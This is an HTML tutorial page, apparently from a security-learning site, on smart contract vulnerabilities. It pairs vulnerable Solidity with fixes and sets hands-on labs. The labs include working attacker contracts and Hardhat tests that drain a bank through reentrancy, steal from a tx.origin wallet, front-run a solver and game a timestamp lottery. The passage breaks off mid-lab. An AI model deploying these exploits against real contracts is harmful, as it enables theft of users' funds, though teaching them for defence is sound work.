@@ -1,0 +1,1554 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+        (function() {
+        const base = document.createElement('base');
+        if(location.hostname.includes('github.io')){
+          base.href = `/HackBook/`;
+        }else{
+          const pathSegments = window.location.pathname.split('/').filter(element => element !== "");
+          const index = pathSegments.indexOf('HackBook');
+          pathSegments.splice(index + 1, pathSegments.length - (index + 1));
+          base.href = pathSegments.join('/') + '/';
+        }
+        document.head.appendChild(base);
+      })();
+    </script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <link rel="icon" type="image/x-icon" href="assets/images/hacker.jpg">
+  <title>HackBook | Smart Contract Vulnerabilities</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/prism.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-solidity.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-javascript.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-bash.min.js"></script>
+  <link rel="stylesheet" href="https://unpkg.com/prism-themes@1.6.0/themes/prism-duotone-sea.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+  <script src="assets/scripts/main.js"></script>
+  <link rel="stylesheet" href="assets/styles/styles.css">
+</head>
+<body>
+  <div class="content">
+    <h1>Smart Contract Vulnerabilities</h1>
+    <hr>
+
+    <div class="tab-container">
+      <div class="tab-buttons">
+        <button class="tab-btn active" data-tab="notes">Notes</button>
+        <button class="tab-btn" data-tab="lab">Lab</button>
+        <button class="tab-btn" data-tab="ctf">CTF Challenges</button>
+      </div>
+
+      <!-- NOTES TAB -->
+      <div class="tab-content active" id="notes">
+
+        <!-- ==================== REENTRANCY ==================== -->
+        <h2>Reentrancy</h2>
+        <p>Attacker contract calls back into the victim before the first execution completes. The DAO hack (2016) exploited this to drain ~$60M.</p>
+
+        <h3>Single-Function Reentrancy</h3>
+<pre><code class="language-solidity">// VULNERABLE: sends ETH before updating balance
+contract VulnerableBank {
+    mapping(address => uint256) public balances;
+
+    function withdraw() public {
+        uint256 amount = balances[msg.sender];
+        (bool ok, ) = msg.sender.call{value: amount}("");  // attacker re-enters here
+        require(ok);
+        balances[msg.sender] = 0;  // too late — already re-entered
+    }
+}
+
+// ATTACKER
+contract Attacker {
+    VulnerableBank bank;
+    constructor(address _bank) { bank = VulnerableBank(_bank); }
+
+    function attack() external payable {
+        bank.deposit{value: msg.value}();
+        bank.withdraw();
+    }
+
+    receive() external payable {
+        if (address(bank).balance >= 1 ether) {
+            bank.withdraw();  // re-enter before balance is zeroed
+        }
+    }
+}</code></pre>
+
+        <h3>Cross-Function Reentrancy</h3>
+        <p>Attacker re-enters a <em>different</em> function that reads the stale state:</p>
+<pre><code class="language-solidity">// During the reentrancy callback, attacker calls transfer()
+// which reads the not-yet-updated balance
+function transfer(address to, uint256 amount) public {
+    require(balances[msg.sender] >= amount);  // stale balance!
+    balances[msg.sender] -= amount;
+    balances[to] += amount;
+}</code></pre>
+
+        <h3>Prevention: Checks-Effects-Interactions</h3>
+<pre><code class="language-solidity">function withdraw() public {
+    uint256 amount = balances[msg.sender];
+    require(amount > 0);           // CHECK
+    balances[msg.sender] = 0;      // EFFECT (update state first)
+    (bool ok, ) = msg.sender.call{value: amount}("");  // INTERACTION (external call last)
+    require(ok);
+}
+
+// Or use OpenZeppelin ReentrancyGuard
+import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
+
+contract SafeBank is ReentrancyGuard {
+    function withdraw() public nonReentrant {
+        // safe — modifier prevents re-entry
+    }
+}</code></pre>
+
+        <!-- ==================== INTEGER OVERFLOW/UNDERFLOW ==================== -->
+        <h2>Integer Overflow / Underflow</h2>
+        <table>
+          <tr><th>Solidity Version</th><th>Behavior</th><th>Mitigation</th></tr>
+          <tr><td>&lt; 0.8.0</td><td>Wraps silently (uint256 max + 1 = 0)</td><td>Use SafeMath library</td></tr>
+          <tr><td>&ge; 0.8.0</td><td>Reverts on overflow/underflow by default</td><td>Built-in (use <code>unchecked{}</code> to opt out for gas savings)</td></tr>
+        </table>
+<pre><code class="language-solidity">// Pre-0.8 vulnerability
+uint8 balance = 255;
+balance += 1;  // wraps to 0!
+
+uint8 small = 0;
+small -= 1;    // wraps to 255!
+
+// Post-0.8: automatic revert
+uint8 x = 255;
+x += 1;  // reverts with panic
+
+// Explicit unchecked (use carefully, only for known-safe math)
+unchecked {
+    uint8 y = 255;
+    y += 1;  // wraps to 0, no revert
+}</code></pre>
+
+        <!-- ==================== ACCESS CONTROL ==================== -->
+        <h2>Access Control Flaws</h2>
+
+        <h3>tx.origin vs msg.sender</h3>
+<pre><code class="language-solidity">// VULNERABLE: uses tx.origin for authentication
+contract Wallet {
+    address public owner;
+
+    function transfer(address to, uint256 amount) public {
+        require(tx.origin == owner);  // BAD: tx.origin is always the EOA
+        payable(to).transfer(amount);
+    }
+}
+
+// Attack: trick owner into calling attacker contract
+contract TxOriginAttack {
+    Wallet wallet;
+    address attacker;
+
+    constructor(address _wallet) {
+        wallet = Wallet(_wallet);
+        attacker = msg.sender;
+    }
+
+    // Owner calls this (e.g., via phishing), tx.origin = owner
+    receive() external payable {
+        wallet.transfer(attacker, address(wallet).balance);
+    }
+}
+
+// FIX: always use msg.sender
+require(msg.sender == owner);</code></pre>
+
+        <h3>Unprotected Functions</h3>
+<pre><code class="language-solidity">// VULNERABLE: anyone can call
+function setOwner(address _newOwner) public {
+    owner = _newOwner;  // no access check!
+}
+
+// VULNERABLE: initialize() can be called by anyone
+function initialize(address _owner) public {
+    owner = _owner;  // no "initialized" check!
+}
+
+// FIX: use modifiers + initialization guard
+bool private initialized;
+function initialize(address _owner) public {
+    require(!initialized, "Already initialized");
+    initialized = true;
+    owner = _owner;
+}</code></pre>
+
+        <!-- ==================== LOGIC ERRORS ==================== -->
+        <h2>Logic Errors</h2>
+<pre><code class="language-solidity">// Wrong comparison
+require(amount >= balance);  // should be balance >= amount
+
+// Off-by-one
+for (uint i = 0; i <= arr.length; i++) {  // should be < not <=
+    // out of bounds on last iteration
+}
+
+// Business logic: allowing withdrawal of 0
+function withdraw(uint256 amount) public {
+    require(balances[msg.sender] >= amount);  // passes when amount = 0
+    // should add: require(amount > 0);
+}</code></pre>
+
+        <!-- ==================== FRONT-RUNNING ==================== -->
+        <h2>Front-Running</h2>
+        <p>Attackers monitor the mempool for pending transactions and submit their own with higher gas to execute first.</p>
+
+        <h3>Sandwich Attack</h3>
+        <ol>
+          <li>Victim submits a large DEX swap (buy token X)</li>
+          <li>Attacker front-runs: buys token X first (price goes up)</li>
+          <li>Victim's swap executes at a higher price</li>
+          <li>Attacker back-runs: sells token X at the inflated price</li>
+        </ol>
+
+        <h3>Prevention: Commit-Reveal</h3>
+<pre><code class="language-solidity">// Phase 1: commit (hash of action + secret)
+mapping(bytes32 => bool) public commits;
+
+function commit(bytes32 hash) public {
+    commits[hash] = true;
+}
+
+// Phase 2: reveal (after N blocks)
+function reveal(uint256 value, bytes32 secret) public {
+    bytes32 hash = keccak256(abi.encodePacked(msg.sender, value, secret));
+    require(commits[hash], "No matching commit");
+    delete commits[hash];
+    // execute action with value
+}</code></pre>
+        <p>Other mitigations: use private mempools (Flashbots Protect), set max slippage, use batch auctions.</p>
+
+        <!-- ==================== DENIAL OF SERVICE ==================== -->
+        <h2>Denial of Service</h2>
+
+        <h3>Push vs Pull Payments</h3>
+<pre><code class="language-solidity">// VULNERABLE: push pattern — if one transfer fails, all fail
+function distributeRewards(address[] memory winners) public {
+    for (uint i = 0; i < winners.length; i++) {
+        payable(winners[i]).transfer(reward);  // reverts if any recipient rejects ETH
+    }
+}
+
+// SAFE: pull pattern — users withdraw individually
+mapping(address => uint256) public pendingWithdrawals;
+
+function claimReward() public {
+    uint256 amount = pendingWithdrawals[msg.sender];
+    require(amount > 0);
+    pendingWithdrawals[msg.sender] = 0;
+    payable(msg.sender).transfer(amount);
+}</code></pre>
+
+        <h3>Gas Limit DoS</h3>
+<pre><code class="language-solidity">// VULNERABLE: unbounded loop over growing array
+address[] public participants;
+
+function refundAll() public {
+    for (uint i = 0; i < participants.length; i++) {  // runs out of gas
+        payable(participants[i]).transfer(1 ether);
+    }
+}
+// FIX: paginate or use pull pattern</code></pre>
+
+        <h3>Unexpected Revert</h3>
+<pre><code class="language-solidity">// Contract that rejects ETH can break protocols
+contract Griefing {
+    receive() external payable {
+        revert("No thanks");
+    }
+    // If a protocol tries to send ETH to this address, it reverts
+}
+// FIX: use call() instead of transfer() and handle failure gracefully</code></pre>
+
+        <!-- ==================== ORACLE MANIPULATION ==================== -->
+        <h2>Oracle Manipulation</h2>
+<pre><code class="language-solidity">// VULNERABLE: using spot price from AMM as oracle
+function getPrice() public view returns (uint256) {
+    // Single-block price from Uniswap pair — easily manipulable with flash loan
+    uint256 reserveA = pair.reserve0();
+    uint256 reserveB = pair.reserve1();
+    return reserveA * 1e18 / reserveB;
+}
+
+// SAFE: Use Chainlink price feeds
+import "@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol";
+
+AggregatorV3Interface priceFeed = AggregatorV3Interface(CHAINLINK_ETH_USD);
+
+function getPrice() public view returns (uint256) {
+    (, int256 price, , uint256 updatedAt, ) = priceFeed.latestRoundData();
+    require(block.timestamp - updatedAt < 3600, "Stale price");
+    require(price > 0, "Invalid price");
+    return uint256(price);
+}</code></pre>
+        <p><strong>TWAP (Time-Weighted Average Price):</strong> Average price over multiple blocks — harder to manipulate than spot price but still not immune to sustained attacks.</p>
+
+        <!-- ==================== STORAGE COLLISION ==================== -->
+        <h2>Storage Collision (Proxy Patterns)</h2>
+        <p>When proxy uses <code>delegatecall</code>, the implementation's code runs against the proxy's storage. If storage layouts don't match, variables collide.</p>
+<pre><code class="language-solidity">// Proxy storage layout
+// slot 0: implementation address
+// slot 1: admin address
+
+// Implementation storage layout
+// slot 0: owner       ← COLLIDES with implementation address!
+// slot 1: value
+
+contract BadProxy {
+    address public implementation;  // slot 0
+    address public admin;           // slot 1
+    // ...delegatecall to implementation
+}
+
+contract Implementation {
+    address public owner;   // slot 0 — overwrites proxy.implementation!
+    uint256 public value;   // slot 1 — overwrites proxy.admin!
+}
+
+// FIX: Use EIP-1967 — store proxy vars in random slots
+bytes32 constant IMPL_SLOT = bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1);</code></pre>
+
+        <!-- ==================== SIGNATURE REPLAY ==================== -->
+        <h2>Signature Replay</h2>
+<pre><code class="language-solidity">// VULNERABLE: no nonce, signature can be reused
+function execute(address to, uint256 amount, bytes memory sig) public {
+    bytes32 hash = keccak256(abi.encodePacked(to, amount));
+    address signer = recoverSigner(hash, sig);
+    require(signer == owner);
+    payable(to).transfer(amount);  // replay the same sig to drain funds
+}
+
+// FIX: include nonce + chain ID (EIP-712)
+mapping(uint256 => bool) public usedNonces;
+
+function execute(address to, uint256 amount, uint256 nonce, bytes memory sig) public {
+    require(!usedNonces[nonce], "Nonce already used");
+    usedNonces[nonce] = true;
+
+    bytes32 hash = keccak256(abi.encodePacked(
+        "\x19\x01",
+        DOMAIN_SEPARATOR,  // includes chain ID
+        keccak256(abi.encode(to, amount, nonce))
+    ));
+    address signer = ECDSA.recover(hash, sig);
+    require(signer == owner);
+    payable(to).transfer(amount);
+}</code></pre>
+
+        <!-- ==================== SELF-DESTRUCT ==================== -->
+        <h2>Self-Destruct Attacks</h2>
+<pre><code class="language-solidity">// selfdestruct forces ETH into a contract, bypassing receive()/fallback()
+contract ForceETH {
+    constructor(address payable target) payable {
+        selfdestruct(target);  // sends all ETH to target, no way to reject
+    }
+}
+
+// VULNERABLE: relies on address(this).balance for logic
+contract Game {
+    function isComplete() public view returns (bool) {
+        return address(this).balance == 7 ether;  // attacker forces extra ETH → never equals 7
+    }
+}
+// FIX: track balances internally, don't rely on address(this).balance</code></pre>
+        <p><strong>Note:</strong> <code>selfdestruct</code> is deprecated as of EIP-6780 (Dencun upgrade). It no longer destroys code/storage on existing contracts — only sends remaining ETH.</p>
+
+        <!-- ==================== TIMESTAMP MANIPULATION ==================== -->
+        <h2>block.timestamp Manipulation</h2>
+<pre><code class="language-solidity">// VULNERABLE: using timestamp for randomness or precise timing
+function play() public payable {
+    // Miners can manipulate timestamp within ~15 second range
+    if (block.timestamp % 2 == 0) {
+        payable(msg.sender).transfer(address(this).balance);
+    }
+}
+
+// FIX: Use Chainlink VRF for randomness
+// For time-based logic, use generous windows (hours, not seconds)</code></pre>
+
+        <!-- ==================== UNINITIALIZED STORAGE ==================== -->
+        <h2>Uninitialized Storage Pointers</h2>
+<pre><code class="language-solidity">// Pre-0.8 vulnerability: local struct defaulted to storage reference
+contract Vulnerable {
+    struct User { address addr; uint256 balance; }
+    User[] users;
+
+    function addUser(address _addr) public {
+        User user;            // pre-0.8: implicitly points to storage slot 0!
+        user.addr = _addr;    // overwrites whatever is in slot 0
+        user.balance = 100;   // overwrites slot 1
+        users.push(user);
+    }
+}
+// Solidity >= 0.8: compiler error if data location is not specified</code></pre>
+
+        <!-- ==================== FLASH LOAN VECTORS ==================== -->
+        <h2>Flash Loan Attack Vectors</h2>
+        <p>Flash loans provide massive uncollateralized capital within a single transaction. Common attack chain:</p>
+        <ol>
+          <li>Borrow large amount via flash loan</li>
+          <li>Manipulate price on DEX (swap large amount to skew reserves)</li>
+          <li>Interact with vulnerable protocol that reads the manipulated price</li>
+          <li>Profit from the price discrepancy</li>
+          <li>Repay flash loan + fee</li>
+        </ol>
+        <p>See the <a href="defi.html">DeFi Attacks</a> page for detailed flash loan exploitation.</p>
+
+      </div>
+
+      <!-- LAB TAB -->
+      <div class="tab-content" id="lab">
+
+        <div class="lab-card">
+          <h4>Lab 1: Exploit Reentrancy</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Deploy a vulnerable bank contract and an attacker contract. Exploit the reentrancy bug to drain all ETH from the bank.</p>
+
+          <h5>Step 1: Vulnerable Contract</h5>
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+contract VulnerableBank {
+    mapping(address => uint256) public balances;
+
+    function deposit() public payable {
+        balances[msg.sender] += msg.value;
+    }
+
+    function withdraw() public {
+        uint256 amount = balances[msg.sender];
+        require(amount > 0, "No balance");
+        (bool ok, ) = msg.sender.call{value: amount}("");
+        require(ok, "Transfer failed");
+        balances[msg.sender] = 0;  // state update after external call!
+    }
+
+    function getBalance() public view returns (uint256) {
+        return address(this).balance;
+    }
+}</code></pre>
+
+          <h5>Step 2: Write the Attacker</h5>
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+import "./VulnerableBank.sol";
+
+contract ReentrancyAttacker {
+    VulnerableBank public bank;
+    address public owner;
+
+    constructor(address _bank) {
+        bank = VulnerableBank(_bank);
+        owner = msg.sender;
+    }
+
+    function attack() external payable {
+        require(msg.value >= 1 ether, "Need at least 1 ETH");
+        bank.deposit{value: 1 ether}();
+        bank.withdraw();
+    }
+
+    receive() external payable {
+        if (address(bank).balance >= 1 ether) {
+            bank.withdraw();
+        }
+    }
+
+    function collect() external {
+        require(msg.sender == owner);
+        payable(owner).transfer(address(this).balance);
+    }
+}</code></pre>
+
+          <h5>Step 3: Test It</h5>
+<pre><code class="language-javascript">const { expect } = require("chai");
+const { ethers } = require("hardhat");
+
+describe("Reentrancy Attack", function () {
+  it("drains the bank", async () => {
+    const [deployer, victim, attacker] = await ethers.getSigners();
+
+    const Bank = await ethers.getContractFactory("VulnerableBank");
+    const bank = await Bank.deploy();
+
+    // Victim deposits 5 ETH
+    await bank.connect(victim).deposit({ value: ethers.parseEther("5") });
+
+    // Attacker deploys exploit
+    const Attacker = await ethers.getContractFactory("ReentrancyAttacker");
+    const attackContract = await Attacker.connect(attacker).deploy(await bank.getAddress());
+
+    // Attack with 1 ETH, drain all 5
+    await attackContract.connect(attacker).attack({ value: ethers.parseEther("1") });
+
+    expect(await bank.getBalance()).to.equal(0);
+    expect(await ethers.provider.getBalance(await attackContract.getAddress()))
+      .to.equal(ethers.parseEther("6"));  // 5 stolen + 1 initial
+  });
+});</code></pre>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 2: Exploit Access Control</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Exploit a contract that uses <code>tx.origin</code> for authentication. Trick the owner into calling your malicious contract to steal their funds.</p>
+
+          <h5>Step 1: Vulnerable Wallet</h5>
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+contract TxOriginWallet {
+    address public owner;
+
+    constructor() payable {
+        owner = msg.sender;
+    }
+
+    function transfer(address payable to, uint256 amount) public {
+        require(tx.origin == owner, "Not owner");  // vulnerable!
+        to.transfer(amount);
+    }
+}</code></pre>
+
+          <h5>Step 2: Attacker Contract</h5>
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+import "./TxOriginWallet.sol";
+
+contract TxOriginAttacker {
+    TxOriginWallet public wallet;
+    address public attacker;
+
+    constructor(address _wallet) {
+        wallet = TxOriginWallet(_wallet);
+        attacker = msg.sender;
+    }
+
+    // Trick owner into sending ETH or calling this contract
+    receive() external payable {
+        wallet.transfer(payable(attacker), address(wallet).balance);
+    }
+}</code></pre>
+
+          <h5>Step 3: Test</h5>
+<pre><code class="language-javascript">describe("tx.origin Attack", function () {
+  it("steals funds when owner interacts with attacker contract", async () => {
+    const [owner, attacker] = await ethers.getSigners();
+
+    const Wallet = await ethers.getContractFactory("TxOriginWallet");
+    const wallet = await Wallet.connect(owner).deploy({ value: ethers.parseEther("10") });
+
+    const Attack = await ethers.getContractFactory("TxOriginAttacker");
+    const attackContract = await Attack.connect(attacker).deploy(await wallet.getAddress());
+
+    // Owner sends ETH to attacker contract (phishing)
+    await owner.sendTransaction({
+      to: await attackContract.getAddress(),
+      value: ethers.parseEther("0")
+    });
+
+    // Wallet drained
+    expect(await ethers.provider.getBalance(await wallet.getAddress())).to.equal(0);
+  });
+});</code></pre>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 3: Front-Running Simulation</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Simulate a front-running attack on a contract that rewards the first solver. Show how a mempool watcher can steal the solution.</p>
+
+          <h5>Step 1: Target Contract</h5>
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+contract FindSecret {
+    bytes32 public hash;
+    address public winner;
+    uint256 public reward;
+
+    constructor(bytes32 _hash) payable {
+        hash = _hash;
+        reward = msg.value;
+    }
+
+    function solve(string memory solution) public {
+        require(winner == address(0), "Already solved");
+        require(keccak256(abi.encodePacked(solution)) == hash, "Wrong");
+        winner = msg.sender;
+        payable(msg.sender).transfer(reward);
+    }
+}</code></pre>
+
+          <h5>Step 2: Simulate the Attack</h5>
+<pre><code class="language-javascript">describe("Front-Running", function () {
+  it("attacker steals solution from mempool", async () => {
+    const [deployer, victim, attacker] = await ethers.getSigners();
+    const secret = "mysecret";
+    const hash = ethers.keccak256(ethers.toUtf8Bytes(secret));
+
+    const Contract = await ethers.getContractFactory("FindSecret");
+    const target = await Contract.deploy(hash, { value: ethers.parseEther("10") });
+
+    // Victim submits solution (in real scenario, this sits in mempool)
+    // Attacker sees it and submits with higher gas
+    // Simulated: attacker calls first
+    await target.connect(attacker).solve(secret);
+
+    expect(await target.winner()).to.equal(attacker.address);
+
+    // Victim's tx now fails
+    await expect(
+      target.connect(victim).solve(secret)
+    ).to.be.revertedWith("Already solved");
+  });
+});</code></pre>
+          <p>In production, attackers use MEV bots/Flashbots to guarantee transaction ordering.</p>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 4: Storage Collision in Proxy</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Demonstrate how misaligned storage layouts between a proxy and implementation cause data corruption. Then fix it using EIP-1967 slots.</p>
+
+          <h5>Step 1: Broken Proxy (Storage Collision)</h5>
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+// Proxy stores impl address in slot 0
+contract BrokenProxy {
+    address public implementation;  // slot 0
+    address public admin;           // slot 1
+
+    constructor(address _impl) {
+        implementation = _impl;
+        admin = msg.sender;
+    }
+
+    fallback() external payable {
+        (bool ok, bytes memory data) = implementation.delegatecall(msg.data);
+        require(ok);
+        assembly { return(add(data, 32), mload(data)) }
+    }
+
+    receive() external payable {}
+}
+
+// Implementation also uses slot 0 — COLLISION
+contract BrokenLogic {
+    uint256 public value;  // slot 0 — overwrites proxy.implementation!
+
+    function setValue(uint256 _v) public {
+        value = _v;  // this actually writes to proxy's storage slot 0
+    }
+}</code></pre>
+
+          <h5>Step 2: Test the Collision</h5>
+<pre><code class="language-javascript">describe("Storage Collision", function () {
+  it("corrupts proxy storage", async () => {
+    const Logic = await ethers.getContractFactory("BrokenLogic");
+    const logic = await Logic.deploy();
+
+    const Proxy = await ethers.getContractFactory("BrokenProxy");
+    const proxy = await Proxy.deploy(await logic.getAddress());
+
+    const proxied = Logic.attach(await proxy.getAddress());
+
+    // This overwrites the implementation address in the proxy!
+    await proxied.setValue(12345);
+
+    // Implementation address is now corrupted
+    const stored = await proxy.implementation();
+    expect(stored).to.not.equal(await logic.getAddress());
+    // proxy.implementation is now 0x0...3039 (12345 in hex)
+  });
+});</code></pre>
+
+          <h5>Step 3: Fix with EIP-1967</h5>
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+contract FixedProxy {
+    // Random storage slots — won't collide with implementation
+    bytes32 private constant IMPL_SLOT =
+        bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1);
+
+    constructor(address _impl) {
+        assembly { sstore(IMPL_SLOT, _impl) }
+    }
+
+    fallback() external payable {
+        address impl;
+        assembly { impl := sload(IMPL_SLOT) }
+        assembly {
+            calldatacopy(0, 0, calldatasize())
+            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
+            returndatacopy(0, 0, returndatasize())
+            switch result
+            case 0 { revert(0, returndatasize()) }
+            default { return(0, returndatasize()) }
+        }
+    }
+
+    receive() external payable {}
+}</code></pre>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 5: Cross-Function Reentrancy</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Exploit a contract where the reentrancy callback targets a different function that reads stale state, allowing double-spending.</p>
+          <div class="setup-code">
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+contract CrossFunctionBank {
+    mapping(address => uint256) public balances;
+
+    function deposit() public payable {
+        balances[msg.sender] += msg.value;
+    }
+
+    function withdraw() public {
+        uint256 amount = balances[msg.sender];
+        require(amount > 0);
+        (bool ok, ) = msg.sender.call{value: amount}("");
+        require(ok);
+        balances[msg.sender] = 0;
+    }
+
+    // During withdraw's callback, attacker calls this
+    function transfer(address to, uint256 amount) public {
+        require(balances[msg.sender] >= amount);  // stale balance!
+        balances[msg.sender] -= amount;
+        balances[to] += amount;
+    }
+}
+
+contract CrossFunctionAttacker {
+    CrossFunctionBank public bank;
+    address public accomplice;
+
+    constructor(address _bank, address _accomplice) {
+        bank = CrossFunctionBank(_bank);
+        accomplice = _accomplice;
+    }
+
+    function attack() external payable {
+        bank.deposit{value: msg.value}();
+        bank.withdraw();
+    }
+
+    receive() external payable {
+        // During withdraw callback, transfer balance to accomplice
+        // Balance hasn't been zeroed yet!
+        bank.transfer(accomplice, bank.balances(address(this)));
+    }
+    // Result: attacker gets ETH from withdraw AND accomplice gets the balance
+}</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Deploy and verify the double-spend works</li>
+              <li>The attacker gets ETH via withdraw + accomplice gets balance via transfer</li>
+              <li>Fix the contract using Checks-Effects-Interactions pattern</li>
+              <li>Would OpenZeppelin's ReentrancyGuard on just <code>withdraw()</code> prevent this?</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 6: Read-Only Reentrancy</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Exploit a DeFi protocol that reads state from another contract during a reentrancy window — the state is inconsistent even though the victim only has view calls.</p>
+          <div class="setup-code">
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+// Vault that reports its total value
+contract Vault {
+    mapping(address => uint256) public deposits;
+    uint256 public totalDeposits;
+
+    function deposit() public payable {
+        deposits[msg.sender] += msg.value;
+        totalDeposits += msg.value;
+    }
+
+    function withdraw() public {
+        uint256 amount = deposits[msg.sender];
+        require(amount > 0);
+        // State not yet updated when callback fires
+        (bool ok, ) = msg.sender.call{value: amount}("");
+        require(ok);
+        deposits[msg.sender] = 0;
+        totalDeposits -= amount;
+    }
+
+    // View function: returns "share price"
+    function sharePrice() public view returns (uint256) {
+        if (totalDeposits == 0) return 1 ether;
+        return address(this).balance * 1 ether / totalDeposits;
+    }
+}
+
+// Oracle that reads vault's share price
+contract VulnerableOracle {
+    Vault public vault;
+    constructor(address _vault) { vault = Vault(_vault); }
+
+    function getPrice() public view returns (uint256) {
+        return vault.sharePrice();  // reads inconsistent state during reentrancy
+    }
+}</code></pre>
+            <p><strong>Key insight:</strong> During <code>withdraw()</code>, the ETH is sent but <code>totalDeposits</code> hasn't been decremented yet. The <code>sharePrice()</code> temporarily shows a lower value (balance decreased but totalDeposits unchanged). Any protocol reading this price during the callback gets a wrong value.</p>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 7: Selfdestruct Force-Send ETH</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Force ETH into a contract that doesn't have a <code>receive()</code> or <code>fallback()</code> function using <code>selfdestruct</code>.</p>
+          <div class="setup-code">
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+// This contract thinks it can control its balance
+contract StrictBalance {
+    uint256 public expectedBalance;
+
+    function deposit() public payable {
+        expectedBalance += msg.value;
+    }
+
+    function isBalanceCorrect() public view returns (bool) {
+        return address(this).balance == expectedBalance;
+    }
+
+    // No receive() or fallback() — "can't" receive unexpected ETH... right?
+}
+
+// Force-send ETH via selfdestruct
+contract ForceSend {
+    constructor(address payable target) payable {
+        selfdestruct(target);  // sends all ETH, bypasses receive/fallback
+    }
+}</code></pre>
+<pre><code class="language-javascript">describe("Force Send", function () {
+  it("breaks balance invariant", async () => {
+    const Strict = await ethers.getContractFactory("StrictBalance");
+    const strict = await Strict.deploy();
+
+    await strict.deposit({ value: ethers.parseEther("1") });
+    expect(await strict.isBalanceCorrect()).to.equal(true);
+
+    // Force-send 1 ETH
+    const Force = await ethers.getContractFactory("ForceSend");
+    await Force.deploy(await strict.getAddress(), { value: ethers.parseEther("1") });
+
+    // Balance is now 2 ETH but expectedBalance is 1 ETH
+    expect(await strict.isBalanceCorrect()).to.equal(false);
+  });
+});</code></pre>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 8: Block.timestamp Dependency</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Exploit a lottery contract that uses <code>block.timestamp</code> as a source of randomness.</p>
+          <div class="setup-code">
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+contract TimestampLottery {
+    uint256 public prize;
+
+    function play() public payable {
+        require(msg.value == 1 ether, "Must send 1 ETH");
+        prize += msg.value;
+
+        // "Random" using timestamp — predictable!
+        if (block.timestamp % 10 == 0) {
+            payable(msg.sender).transfer(prize);
+            prize = 0;
+        }
+    }
+}
+
+contract TimestampAttacker {
+    TimestampLottery public lottery;
+
+    constructor(address _lottery) {
+        lottery = TimestampLottery(_lottery);
+    }
+
+    function attack() external payable {
+        // Only play when we know we'll win
+        require(block.timestamp % 10 == 0, "Not winning timestamp");
+        lottery.play{value: 1 ether}();
+    }
+
+    receive() external payable {}
+}</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Deploy lottery with some initial ETH from other players</li>
+              <li>Deploy attacker and call <code>attack()</code> — it only executes when timestamp is favorable</li>
+              <li>In Hardhat, use <code>evm_setNextBlockTimestamp</code> to control the timestamp</li>
+              <li>How would you fix this? (hint: Chainlink VRF for on-chain randomness)</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 9: Gas Griefing Attack</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Exploit a contract that forwards calls with a fixed gas limit, causing the forwarded call to fail while the outer transaction succeeds.</p>
+          <div class="setup-code">
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+contract Relayer {
+    mapping(bytes32 => bool) public executed;
+
+    // Forwards meta-transactions
+    function relay(address target, bytes calldata data, bytes32 txId) external {
+        require(!executed[txId], "Already executed");
+        executed[txId] = true;
+
+        // Forwards with limited gas — griefable!
+        (bool ok, ) = target.call{gas: 50000}(data);
+        // Notice: doesn't revert on failure — marks as executed anyway!
+        // Griefing: provide just enough gas for relay() but not for target.call
+    }
+}
+
+contract ExpensiveTarget {
+    uint256[] public data;
+
